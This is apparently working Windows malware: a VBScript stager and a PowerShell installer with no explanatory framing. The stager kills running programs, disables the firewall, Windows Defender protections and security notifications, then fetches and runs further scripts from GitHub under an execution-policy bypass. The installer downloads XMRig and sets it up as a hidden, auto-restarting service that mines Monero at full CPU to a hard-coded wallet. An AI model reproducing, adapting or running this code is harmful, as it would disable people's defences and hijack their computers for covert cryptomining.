Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -Command Stop-Process -Name 'cmd','powershell','xmrig','chromedriver','msedgedriver' -Force -ErrorAction SilentlyContinue", 0, True
objShell.Run "powershell.exe -Command Get-Process | Where-Object { $_.MainWindowHandle -ne 0 } | Stop-Process -Force", 0, True
objShell.Run "powershell.exe -Command Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False", 0, True
objShell.Run "powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true", 0, True
objShell.Run "powershell.exe -Command Set-MpPreference -MAPSReporting Disabled", 0, True
objShell.Run "powershell.exe -Command Set-MpPreference -SubmitSamplesConsent NeverSend", 0, True
objShell.Run "powershell.exe -Command Set-MpPreference -SubmitSamplesConsent 2", 0, True
objShell.Run "powershell.exe -Command reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' /v 'DisableRealtimeMonitoring' /t REG_DWORD /d '1' /f", 0, True
objShell.Run "powershell.exe -Command reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender' /v DisableAntiSpyware /t REG_DWORD /d 1 /f", 0, True
objShell.Run "powershell.exe -Command reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet' /v 'DisableBlockAtFirstSeen' /t REG_DWORD /d '1' /f", 0, True
objShell.Run "powershell.exe -Command reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PasswordLess\Device' /v DevicePasswordLessBuildVersion /t REG_DWORD /d 0 /f", 0, True
objShell.Run "powershell.exe -Command Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1", 0, True
objShell.Run "powershell.exe -Command Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'SubmitSamplesConsent' -Value 2", 0, True
objShell.Run "powershell.exe -Command reg add 'HKCU\Software\Microsoft\Windows\CurrentVersion\PushNotifications' /v 'ToastEnabled' /t REG_DWORD /d '0' /f", 0, True
objShell.Run "powershell.exe -Command reg add 'HKCU\Software\Policies\Microsoft\Windows Defender Security Center\Notifications' /v 'DisableEnhancedNotifications' /t REG_DWORD /d '1' /f", 0, True
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/system/refs/heads/main/Autorun.vbs -OutFile C:\Users\Public\Downloads\Autorun.vbs", 0, True
WScript.Sleep 1000
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/Salvium-SAL-/refs/heads/main/configure_system.ps1 -OutFile C:\Users\Public\Downloads\configure_system.ps1", 0, True
WScript.Sleep 2000
objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\configure_system.ps1", 0, True
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
$xmrigFolder = "C:\xmrig"
$serviceName = "XMRig_KonTum"
New-Item -ItemType Directory -Force -Path $xmrigFolder | Out-Null
$zipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip"
$zipPath = "$env:TEMP\xmrig.zip"
Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
Expand-Archive -Path $zipPath -DestinationPath $xmrigFolder -Force
$xmrigExe = Get-ChildItem -Path $xmrigFolder -Recurse -Filter "xmrig.exe" | Select-Object -First 1 -ExpandProperty FullName
$nssmZipUrl = "https://nssm.cc/ci/nssm-2.24-101-g897c7ad.zip"
$nssmZipPath = "$env:TEMP\nssm.zip"
Invoke-WebRequest -Uri $nssmZipUrl -OutFile $nssmZipPath -UseBasicParsing
Expand-Archive -Path $nssmZipPath -DestinationPath $xmrigFolder -Force
$nssmExe = Get-ChildItem -Path $xmrigFolder -Recurse -Filter "nssm.exe" | Where-Object { $_.DirectoryName -like "*win64*" } | Select-Object -First 1 -ExpandProperty FullName
$wallet = "87LVyXpW64PLompVtz6nYsULGAGckEv63CGW8euYg21VV7BB8sALsvadF1JK7E6g5VV71gJSXJcBrPEJjpjwhbX5HBUCc5s"
$worker = "x3"   # ← Chỉ còn KonTum như bạn muốn
$threads = (Get-CimInstance Win32_Processor).NumberOfLogicalProcessors
$appParams = "-o pool.hashvault.pro:443 " +
             "-u $wallet " +
             "-p $worker " +
             "--coin monero " +
             "--tls " +
             "--threads=$threads " +
             "--cpu-max-threads-hint=100 " +
             "--cpu-priority=5 " +
             "--randomx-mode=fast " +
             "--randomx-1gb-pages " +
             "--randomx-jit " +
             "--randomx-init=full " +
             "--donate-level=0 " +
             "--http-enabled --http-port=8080"
secedit /export /cfg "$env:TEMP\secpol.cfg" | Out-Null
(Get-Content "$env:TEMP\secpol.cfg") -replace 'SeLockMemoryPrivilege =.*', 'SeLockMemoryPrivilege = *S-1-5-18' | Set-Content "$env:TEMP\secpol_new.cfg"
secedit /configure /db secedit.sdb /cfg "$env:TEMP\secpol_new.cfg" /areas USER_RIGHTS | Out-Null
if (Get-Service -Name $serviceName -ErrorAction SilentlyContinue) {
    & $nssmExe stop $serviceName 2>$null
    & $nssmExe remove $serviceName confirm 2>$null
}
& $nssmExe install $serviceName $xmrigExe
& $nssmExe set $serviceName AppParameters $appParams
& $nssmExe set $serviceName AppDirectory $xmrigFolder
& $nssmExe set $serviceName AppNoConsole 1
& $nssmExe set $serviceName Start SERVICE_AUTO_START
& $nssmExe set $serviceName AppExit Default Restart
& $nssmExe start $serviceName
